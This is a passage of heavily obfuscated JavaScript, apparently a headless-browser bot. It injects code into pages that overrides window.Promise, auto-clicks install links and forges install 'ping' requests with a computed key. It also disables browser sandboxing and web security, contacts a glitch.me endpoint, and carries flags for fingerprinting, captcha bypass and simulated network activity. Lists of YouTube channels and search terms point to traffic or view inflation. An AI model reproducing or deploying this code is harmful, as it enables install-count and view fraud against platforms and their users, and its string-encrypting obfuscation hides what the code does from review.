                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1ab1 * 0x1 + -0x25ac + 0xb00 | L >>> -0x378 + 0x1b7 * 0x1 + -0x1dc * -0x1) + (M & N | ~M & O) + P + (-0x7a626e7e + 0x730d * -0x1510d + 0x16c5edcc0) + Q[J] << -0xc63 + 0x163 * 0x11 + -0xb30) << 0x19 * -0x27 + 0xa * -0x1a9 + 0xa * 0x20b | P >>> -0x2490 + -0x9ea + 0x109 * 0x2d) + (L & (M = M << -0x1b83 + 0x20b5 + -0x14 * 0x41 | M >>> -0x1 * -0x1508 + -0x26 * 0x9d + 0x248) | ~L & N) + O + (-0x57 * 0x1e59410 + 0x5a12ffa6 + 0xa574cb63) + Q[J + (-0x1075 + -0x1 * -0x6 + 0x1070)] << 0x6ca + 0x222c + -0x6b * 0x62) << 0xb1f + -0x1f92 * -0x1 + -0x2aac | O >>> -0x4c * -0x52 + 0x2e3 * 0x1 + -0x364 * 0x8) + (P & (L = L << -0x1a39 + -0x33c + -0x1d93 * -0x1 | L >>> -0x17 * -0x92 + -0xbb4 + -0x168) | ~P & M) + N + (-0x1ab32b7c + -0x7fea0db * 0x3 + 0x4698c3d3 * 0x2) + Q[J + (0x1732 + 0x19bb + -0x6fd * 0x7)] << -0x1563 * 0x1 + 0x1c * 0xbb + 0xef) << 0x200c + 0x649 + -0x2650 | N >>> -0x70 * 0x31 + -0x1d01 + 0x50e * 0xa) + (O & (P = P << -0x3a * 0xb + -0x2131 + 0x23cd | P >>> -0xecb + -0x2656 + 0x3523) | ~O & L) + M + (-0x1 * 0x71574d69 + -0x5c9 * 0x185d6b + 0x1 * 0x158ce3705) + Q[J + (0xaff * -0x1 + 0x1 * -0x14d7 + 0x1fd9)] << 0x1 * -0x2193 + -0x8d3 + 0x2a66) << 0x3 * 0x520 + -0x1 * -0x887 + -0x17e2 | M >>> -0x1caf + 0x22fe + -0x2 * 0x31a) + (N & (O = O << -0x1 * 0x2e1 + -0xf26 + -0x3a1 * -0x5 | O >>> 0x3 * -0x1e9 + -0x37 * 0x5b + 0xa6 * 0x27) | ~N & P) + L + (0x7ed9312f * -0x1 + 0x53d2 * 0x1b6b + 0xd0617c02) + Q[J + (-0x1 * -0x24e9 + 0xd1 + 0x2 * -0x12db)] << -0x16f8 + 0x4b6 * 0x1 + 0x1 * 0x1242, N = N << 0x5 * 0x227 + -0x18fc + 0xe57 | N >>> 0x1d7 + 0x127b + 0x4 * -0x514;
              for (; J < 0x19eb + -0x9a2 + -0x1021; J += 0x1 * -0x23ad + -0x632 + 0x29e4)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1294 + -0x122c + -0x63 | L >>> -0xf12 + -0x110a + 0x2037) + (M ^ N ^ O) + P + (-0xc9c6a8a2 + -0x2ee826c3 * 0x1 + 0x16788bb06) + Q[J] << -0x240b + -0x8e * 0x1a + -0x1 * -0x3277) << 0x238f + 0x1 * -0x1811 + -0x3 * 0x3d3 | P >>> 0x8 * 0x2b4 + -0x87 * 0x44 + 0xe57) + (L ^ (M = M << -0x1 * 0x1ebb + -0xb36 + 0x2a0f | M >>> -0x26b5 + -0x8d1 + -0x2 * -0x17c4) ^ N) + O + (0x90c4b66e + 0xc7dc257e + -0xe9c6f04b * 0x1) + Q[J + (-0x1cfb + 0x1e98 + -0x19c)] << 0x128a + 0x683 * -0x3 + 0xff) << 0x352 + -0x2 * -0xd01 + -0x1d4f | O >>> -0x56 * -0x4c + -0x1bd7 + 0x6 * 0x67) + (P ^ (L = L << -0x11cb + -0xd * -0x155 + -0x1 * -0x98 | L >>> 0x106 + 0x1e11 + -0x6d * 0x49) ^ M) + N + (-0x1 * 0x4754544d + 0x1 * -0x624a4357 + 0x118788345) + Q[J + (-0x2597 + -0x1 * -0x202e + 0x56b * 0x1)] << -0x19d * -0x5 + 0x1c05 + 0x120b * -0x2) << -0x1 * -0x377 + -0x133f + -0x5 * -0x329 | N >>> 0x6d9 + 0x25 * 0xfd + 0x2b4f * -0x1) + (O ^ (P = P << 0x1ab5 + -0x1a * 0x24 + -0x16ef | P >>> -0xe21 + 0x1 * 0x1139 + 0x9e * -0x5) ^ L) + M + (-0x41759593 * 0x1 + -0x1 * 0x964a9fe2 + 0x1469a2116) + Q[J + (-0xc81 * -0x1 + 0x4c7 + -0x1145)] << -0x6 * 0x5f3 + -0x1d4e + 0x4100) << 0xada + 0xf * 0x5e + -0x2f * 0x59 | M >>> 0x246b + 0x1351 + -0x37a1) + (N ^ (O = O << 0x2b * 0x51 + -0x972 + 0x17 * -0x2d | O >>> -0x97d + -0x1 * 0x14b1 + -0x150 * -0x17) ^ P) + L + (-0x9855c021 + -0x1fd640e2 * -0x5 + 0x68006758) + Q[J + (-0xa8b + -0x1 * -0x191d + -0xe8e)] << 0x2198 + 0x12 * -0x45 + 0x1a * -0x11b, N = N << -0xa42 + -0x1 * 0x1915 + 0x2375 | N >>> 0x24b + -0x2 * -0x60a + -0xe5d;
              for (; J < -0x1f33 + -0x189 * 0x19 + -0x45d * -0x10; J += -0x1f99 * -0x1 + 0x4b3 + -0x2447)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xef4 + -0xba * 0x1 + 0x1 * -0xe35 | L >>> 0x1342 + 0x314 + 0x32d * -0x7) + (M & N | M & O | N & O) + P - (0x4f6d * -0x219aa + -0x1 * -0x551dc3ad + 0xc296e2d9) + Q[J] << -0x69 * 0x5d + -0x2564 + 0x4b89 * 0x1) << 0x2b2 + -0xab5 * -0x3 + 0x1166 * -0x2 | P >>> 0xd57 + -0x2216 + 0x14da) + (L & (M = M << 0xd7c + 0x4 * 0x6c5 + -0x1f * 0x14e | M >>> -0x22ba + -0x11d2 + 0x1f * 0x1b2) | L & N | M & N) + O - (0x1183 * 0x11036 + 0x170472ce + 0x4740eeb4) + Q[J + (-0x9cb * 0x2 + -0x1e23 + -0x31ba * -0x1)] << 0x12e1 + 0x241 * 0x3 + -0x88c * 0x3) << -0x1 * -0xcb6 + 0x1362 + -0x17 * 0x165 | O >>> -0x1 * 0x1b56 + -0x1afa + 0x366b) + (P & (L = L << 0x3a * -0x2e + -0x17 * 0x15f + 0x2a13 * 0x1 | L >>> 0x6 * 0x42d + 0x16b8 + -0x2fc4) | P & M | L & M) + N - (0x186e * -0x2ab0b + -0x631db1e0 + 0x115307bbe) + Q[J + (-0x8f + -0x8e7 * 0x3 + 0x1b46)] << -0x24f + -0x1d60 + 0x1faf) << 0xe9 * 0x16 + -0x2 * -0x72c + -0x2259 * 0x1 | N >>> 0x12ec + -0x15e * -0x4 + -0x1849) + (O & (P = P << -0x1 * 0xa3f + 0x811 + 0x24c | P >>> -0x202a + -0x1 * 0xc07 + 0x16d * 0x1f) | O & L | P & L) + M - (-0x3117ee2f + 0xb0f7e76a + -0x7 * 0x223f571) + Q[J + (-0xaba * -0x3 + -0xdf3 + -0x6a * 0x2c)] << 0x19a5 * 0x1 + 0x12bc + 0x2c61 * -0x1) << -0xf10 + 0x1641 + -0x72c | M >>> 0x1a0b + -0x2 * 0x118f + 0x92e) + (N & (O = O << -0xd0 * 0x23 + 0x1337 + -0x3 * -0x31d | O >>> -0x759 + -0x3e0 + 0xb3b) | N & P | O & P) + L - (0x36ee7b4b + -0x18d6532d + 0x52cc1b06) + Q[J + (-0x1c9 * -0x11 + 0xb93 + -0x29e8)] << -0x20 * -0x7e + -0xb * -0x117 + -0x93f * 0x3, N = N << -0xa8e + -0x2209 + 0x23 * 0x147 | N >>> 0x27 * 0x26 + -0x1c0d + -0x1 * -0x1645;
              for (; J < -0x5f4 + 0xa8a * 0x2 + -0xed0; J += -0x1f2a + -0x55 * 0x2d + 0x2e20)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xb * 0x1b9 + -0x6e0 * -0x5 + -0x1 * 0x354e | L >>> 0x1b3c + -0x1a * 0xe3 + 0x1 * -0x413) + (M ^ N ^ O) + P - (0x57190f09 * -0x1 + 0x374f2690 + 0x556726a3) + Q[J] << 0x7b2 + -0x106f + -0x1 * -0x8bd) << -0x2 * -0x63e + -0x3f6 + -0x1 * 0x881 | P >>> 0x180 + -0x1de4 + 0x1 * 0x1c7f) + (L ^ (M = M << 0x56 * -0x49 + 0x13f7 * 0x1 + 0x4ad | M >>> 0x109 * -0x13 + -0x9ef * 0x3 + 0x317a) ^ N) + O - (-0x6a91 * 0xddc5 + 0x83d138b + 0x89b15934) + Q[J + (0x12 * 0x86 + -0x5 * 0x1fb + 0x7c)] << 0xfd6 + -0x2 * 0xc73 + -0x5 * -0x1d0) << 0x2246 + 0x2599 * 0x1 + -0x47da | O >>> 0x1741 + 0x495 + 0x1f * -0xe5) + (P ^ (L = L << -0x2 * 0xf1e + 0x45 * 0x24 + -0x2 * -0xa53 | L >>> 0x2327 * 0x1 + 0x79 * 0x1 + -0x239e) ^ M) + N - (-0x91efe89 + -0x66b82faa + 0x1 * 0xa5746c5d) + Q[J + (-0xe8a + 0x1cf1 + -0xe65)] << 0x877 + 0x1af4 + -0x236b) << 0x17f7 + -0x829 * -0x2 + -0x6 * 0x6b6 | N >>> -0x878 + 0xead + 0x1 * -0x61a) + (O ^ (P = P << -0x2076 + -0xf81 + -0x175 * -0x21 | P >>> -0x2486 + -0x1237 + 0x36bf) ^ L) + M - (0x62fa8ff3 + -0x1 * -0x54f5fd6b + -0x82534f34) + Q[J + (-0x2493 + 0x1 * -0x203f + 0x44d5)] << 0x1 * 0x15d3 + 0x5 * -0x661 + 0x1 * 0xa12) << 0x2261 + 0x1 * 0xda5 + -0x3001 | M >>> -0x25b4 + 0x9 * 0x23d + 0x11aa) + (N ^ (O = O << -0x694 * 0x3 + -0x1e3c + 0x6 * 0x859 | O >>> -0xcf8 + -0x2b * 0x7c + 0x21ce) ^ P) + L - (-0x9 * -0x95ae1ad + 0xb69b * 0x482f + -0x5211cf60) + Q[J + (0x1145 + -0x1 * 0x18a7 + -0x3b3 * -0x2)] << 0x230c + -0xa * 0x3a9 + 0x18e, N = N << 0x1 * 0x2095 + -0x12ac + -0xdcb | N >>> 0xb85 * -0x1 + -0x15f9 + 0x2180;
              this['h0'] = this['h0'] + L << 0x5b * -0x19 + -0x1f5a + -0x283d * -0x1, this['h1'] = this['h1'] + M << 0x21f9 + 0x5 * 0x4d9 + -0x3a36, this['h2'] = this['h2'] + N << -0x2235 * 0x1 + 0x1 * -0x2392 + 0x45c7, this['h3'] = this['h3'] + O << 0x1 * 0xff2 + -0x2 * 0x57b + -0x4fc, this['h4'] = this['h4'] + P << -0xfea + -0x2 * 0x8e0 + -0x8b * -0x3e;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x1afd + 0x3 * -0x476 + 0x287b & -0x1 * -0xd2d + 0x3f6 * -0x1 + -0x2 * 0x494] + w[J >> -0x193b + 0x1cb7 + -0x364 & -0xfbb + 0x257c + -0x15b2 * 0x1] + w[J >> 0x23dc + 0x24 * 0x13 + 0x1ac * -0x17 & -0x7b3 + -0x136f + 0x1b31] + w[J >> -0x11af + -0x8f3 + 0x1ab2 & 0x1 * 0x8f7 + 0xa * -0x66 + 0xb4 * -0x7] + w[J >> 0x601 * -0x2 + -0x2441 * -0x1 + -0x1833 & -0x4 * 0x45d + 0x1748 + -0x5c5] + w[J >> 0x634 * -0x2 + 0xcc6 + -0x56 & -0x241a + 0x1ca3 + 0x786] + w[J >> -0x1705 + 0x4ae * 0x6 + -0x50b & -0xc88 + -0x1b * 0xee + 0x25b1] + w[0xdcb + -0x196a + 0x12b * 0xa & J] + w[K >> 0x10c9 + 0x1684 + -0x1 * 0x2731 & -0x11bf + 0xa3a + -0x5 * -0x184] + w[K >> 0x259 * -0x3 + 0x44b + 0x2d8 & -0x1338 + -0x2535 * 0x1 + 0x3 * 0x12d4] + w[K >> 0x121a + -0x1d78 + 0xb72 & -0x1a9d * -0x1 + -0xb7 * 0x33 + 0x5 * 0x1fb] + w[K >> 0x1e5f + 0x4 * -0x903 + 0x5bd & -0x3a6 + 0x8e4 + -0x1 * 0x52f] + w[K >> 0x14d9 + 0x1955 * -0x1 + -0x122 * -0x4 & -0x1824 + 0x156d * 0x1 + 0x2 * 0x163] + w[K >> 0x796 + 0x22d7 + -0x2a65 * 0x1 & 0x52 * 0x1a + -0x18 * 0x1d + -0x58d] + w[K >> 0x1f1b + -0x1 * -0xf82 + -0x2e99 & 0x539 + -0x1e66 + -0x50c * -0x5] + w[0x1866 + -0x76d * -0x3 + -0x11 * 0x2be & K] + w[L >> 0x2700 + -0x3bb + -0x2329 * 0x1 & -0x1aea + 0x121f * 0x1 + 0x8da * 0x1] + w[L >> 0x26f1 * 0x1 + 0x329 + -0x2a02 & 0x1d * 0x6d + 0x1778 + -0x11e1 * 0x2] + w[L >> 0x16b4 + 0xac + -0x174c & -0xaa3 * 0x3 + 0x5a9 * 0x2 + -0x14a6 * -0x1] + w[L >> 0x13 * 0x11b + -0xa11 + -0x6 * 0x1d0 & -0x5 * 0x2e + 0x24e2 + 0x11 * -0x21d] + w[L >> 0x2352 + -0x127 * 0xb + -0x1699 & -0x21 * -0x29 + -0x1061 + 0xb27] + w[L >> 0x269c + -0x17a * 0xf + -0x106e & 0xf2 * -0x1c + -0x19dc + 0x3463 * 0x1] + w[L >> 0x2075 * -0x1 + 0x384 + 0x1cf5 & 0xae0 + -0x33 * 0x26 + 0x115 * -0x3] + w[0xce5 * 0x3 + -0x195b + -0xd45 & L] + w[M >> 0x1 * 0x19a8 + -0xce2 + -0xcaa * 0x1 & 0x25 + -0x1b81 + 0x1 * 0x1b6b] + w[M >> -0x9f1 * -0x1 + 0x1294 + -0x1c6d & 0x19 * 0x156 + -0x10d9 + -0x107e] + w[M >> 0x59f * -0x1 + 0x2d3 * -0x6 + -0x1 * -0x16a5 & -0x12b3 + 0x82b + 0xa97] + w[M >> 0x5cf * -0x6 + -0x1f3 * -0xb + 0x1 * 0xd79 & 0xaf7 + -0x6b * 0x59 + -0x1 * -0x1a4b] + w[M >> 0x1f53 + 0x2 * -0x136e + 0x287 * 0x3 & -0x1 * 0xd0f + -0x116 * -0xc + -0x1 * -0x16] + w[M >> -0x76a * 0x1 + 0x20ea + 0xcbc * -0x2 & -0x1051 + -0x197a + -0x1e7 * -0x16] + w[M >> 0x7 * 0x15d + -0x10 * -0x18d + -0x2257 & 0x114c + -0x21fb + 0x10be] + w[0x54d + 0x4b2 + -0x9f0 & M] + w[N >> 0x111b + -0x1181 + 0x82 & -0x4 * -0x93a + -0x8a + -0x244f] + w[N >> -0x3 * -0x79c + -0x2337 + 0xc7b & 0x13c0 * -0x1 + -0x2609 + 0x1348 * 0x3] + w[N >> 0x7c * -0x38 + 0x113 * -0xb + 0x1 * 0x2705 & -0x8c8 * -0x2 + 0x16e8 + -0x2869] + w[N >> 0xd12 + 0x202d + -0x2d2f & -0x578 + -0x5cd * -0x5 + -0x177a] + w[N >> 0x1f59 + 0xb61 + -0x1 * 0x2aae & -0x1b7d + 0x17 * -0xdf + 0x2f95] + w[N >> -0x25ff + -0x44 * 0x47 + 0x38e3 & 0x26ee + 0x18d * 0x4 + 0x1 * -0x2d13] + w[N >> -0x47a + -0x15b2 + 0x1a30 & -0xe32 + -0x1 * 0x19c9 + 0x280a] + w[-0xb48 + 0x1cc7 + -0x1170 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x11 * -0x1d5 + 0x25db + -0x44e8 & -0x1f9 * 0xe + 0x1d0f + -0x26 * 0x3,
                J >> -0xfd6 + 0x24af + -0x14c9 * 0x1 & 0x5 * -0x172 + 0x1b69 + -0x1330,
                J >> -0x71d * 0x1 + 0x1e0d * -0x1 + 0x2532 & 0x56d * 0x5 + 0x11e4 + -0x2c06,
                0x17 * 0x13d + -0x1127 + -0xa55 & J,
                K >> 0x2623 + 0x22ec + -0x48f7 & 0x1226 + -0x2343 + 0xf4 * 0x13,
                K >> 0xce3 * 0x1 + -0x18d1 * -0x1 + -0x25a4 & 0x103e + -0xd44 + -0x1fb,
                K >> -0x1c12 + -0xe8 * 0x1a + 0x33aa & 0x10f3 * -0x1 + 0xa9 * 0x39 + -0x1 * 0x13af,
                -0x1ae9 + 0xb56 + 0x1092 & K,
                L >> 0x5 * 0xf7 + -0x1cd * 0x13 + 0x6f * 0x44 & -0x339 * -0x2 + 0x26f6 + -0x2c69,
                L >> -0x2187 + -0x137 * 0x1f + 0x4740 & -0x1 * -0x1ca2 + 0x18fd + -0x8 * 0x694,
                L >> -0x693 + -0x1c4f + 0x1 * 0x22ea & 0x2 * 0x120a + -0xd76 + -0x159f,
                0xad0 + 0xbf0 + -0x1 * 0x15c1 & L,
                M >> -0x208e + 0xf97 + 0x110f & -0x1731 + -0x175a + 0x2f8a,
                M >> 0x153a + -0xf5 + 0x7 * -0x2e3 & -0x22aa + 0x519 + -0x30 * -0xa3,
                M >> -0x405 + 0x248e + -0x2081 & 0x248 * 0x1 + -0x1 * -0xfd1 + -0x111a,
                0x283 * -0xb + -0xfe9 * 0x1 + -0x36d * -0xd & M,
                N >> -0x1e34 + -0x67 * 0x24 + 0x2cc8 & -0x2a1 * 0x2 + -0x4 * 0x52 + 0x3 * 0x283,
                N >> 0x38b * -0xb + -0x1a63 + 0x416c & -0x157b + -0x7f1 + 0x257 * 0xd,
                N >> -0x1 * -0x891 + -0x85b + -0x2e & 0x2 * -0xa7 + -0x1ba + 0x407,
                0x17d9 + 0xcc5 + -0x33d * 0xb & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x647 * 0x5 + -0x29 * -0xbe + -0x3dbd), (K = new DataView(J))['setUint32'](0x8af + 0x113e + -0x19ed, this['h0']), K['setUint32'](-0xd67 + 0x1253 * 0x1 + -0x4e8, this['h1']), K['setUint32'](-0x6e + -0x1033 * -0x1 + -0xfbd, this['h2']), K['setUint32'](0x1ce1 + -0x1b50 + -0x185, this['h3']), K['setUint32'](-0x841 * -0x1 + -0xd * 0x221 + 0x137c, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x1faa + 0x327 * -0xb + -0x14d * -0x33];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x13a6 * -0x1 + 0x1355 + 0x51;
            J[0x19ce + 0x237 * -0x6 + -0xc84]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x762 + 0x56 * 0x35 + -0x1930] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x2383 * 0x1 + -0x1be7 * -0x1 + 0x79d), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x269 * 0x3 + 0x2019 + -0x18dd;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x36 * -0x51 + -0x4 * -0x53c + -0x202a * 0x1), Promise['resolve'](0x19be + 0x12eb + -0xb2a * 0x4);
      })), log(X(0x3)), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0xa46 * 0x2 + 0x1b59 * 0x1 + 0x1 * -0x2fe5; j < 0x1 * -0x5f4 + -0x10d0 + -0x57 * -0x43; j++)
    i();
}
const NETWORK_PATIENCE = 0xcba + -0x34 * -0x86 + -0x8b2 + (-0x4 * 0x5f2 + 0x107 * -0x11 + 0x34f7) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x198f + 0x1b08 + 0x542 * -0xa) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + Y(0x5, 'zdBz') + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x50 * 0x68 + 0xf * -0x256 + 0x28a; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1 * -0x24dd + -0x1 * -0x1d5d + -0x423a);
    let h = e[f];
    if (c['glrnix'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x531 + 0x2613 + -0x20e2, r, s, t = 0x1 * -0x26cb + 0x11a7 + 0x1524; s = m['charAt'](t++); ~s && (r = q % (0x5 * 0x1d + -0x19 * 0xf6 + 0x1779 * 0x1) ? r * (-0x1941 + -0x1 * 0x1ce1 + 0x3662) + s : s, q++ % (-0x2259 + -0x1 * -0xf09 + 0x1354)) ? o += String['fromCharCode'](-0x2 * 0xe98 + -0xb * -0x1ef + -0x7 * -0x146 & r >> (-(-0x1 * 0xb1b + -0xd4d * -0x2 + -0xf7d) * q & -0x150 * -0x6 + -0x10d * 0xf + 0x4b * 0x1b)) : -0x919 + -0x16ce + 0x1 * 0x1fe7) {
          s = n['indexOf'](s);
        }
        for (let u = -0x23af + 0x24db + -0x12c, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0xdf1 * 0x1 + -0x2398 + 0x1 * 0x3199))['slice'](-(0x3 * -0xc84 + -0xfc1 * -0x2 + 0x60c));
        }
        return decodeURIComponent(p);
      };
      c['ZWsmri'] = i, b = arguments, c['glrnix'] = !![];
    }
    const j = e[0x99a + 0x2016 + -0x29b0],
      k = f + j,
      l = b[k];
    return !l ? (h = c['ZWsmri'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1 * -0x24dd + -0x1 * -0x1d5d + -0x423a);
    let h = e[f];
    if (b['awlxzz'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x531 + 0x2613 + -0x20e2, s, t, u = 0x1 * -0x26cb + 0x11a7 + 0x1524; t = n['charAt'](u++); ~t && (s = r % (0x5 * 0x1d + -0x19 * 0xf6 + 0x1779 * 0x1) ? s * (-0x1941 + -0x1 * 0x1ce1 + 0x3662) + t : t, r++ % (-0x2259 + -0x1 * -0xf09 + 0x1354)) ? p += String['fromCharCode'](-0x2 * 0xe98 + -0xb * -0x1ef + -0x7 * -0x146 & s >> (-(-0x1 * 0xb1b + -0xd4d * -0x2 + -0xf7d) * r & -0x150 * -0x6 + -0x10d * 0xf + 0x4b * 0x1b)) : -0x919 + -0x16ce + 0x1 * 0x1fe7) {
          t = o['indexOf'](t);
        }
        for (let v = -0x23af + 0x24db + -0x12c, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0xdf1 * 0x1 + -0x2398 + 0x1 * 0x3199))['slice'](-(0x3 * -0xc84 + -0xfc1 * -0x2 + 0x60c));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x99a + 0x2016 + -0x29b0,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x1 * 0xa9f + 0x4c * -0x6b + 0x1525; u < -0x1d38 + -0x93e + -0x1 * -0x2776; u++) {
          p[u] = u;
        }
        for (u = -0x410 * 0x3 + 0x1df6 + -0x11c6; u < -0x79 * -0x4a + -0x1bf4 + -0x606; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x481 + -0x447 + 0xc6), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0xa * 0x35b + -0x22f4 * 0x1 + 0x166, q = 0x41 * -0x39 + -0x14c + 0xfc5 * 0x1;
        for (let v = -0xbde + 0xfbb + 0x1 * -0x3dd; v < n['length']; v++) {
          u = (u + (-0x2ab + -0x1e36 + 0x20e2)) % (0x3 * -0x2e5 + 0x1c93 + -0x4b9 * 0x4), q = (q + p[u]) % (-0x74e + -0x482 * -0x1 + -0x51 * -0xc), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x16db * -0x1 + -0x1978 + 0xcf * 0x3d)]);
        }
        return t;
      };
      b['bCuskN'] = m, c = arguments, b['awlxzz'] = !![];
    }
    const j = e[-0x49 * 0x77 + -0x673 + 0x1431 * 0x2],
      k = f + j,
      l = c[k];
    return !l ? (b['WndKhm'] === undefined && (b['WndKhm'] = !![]), h = b['bCuskN'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + 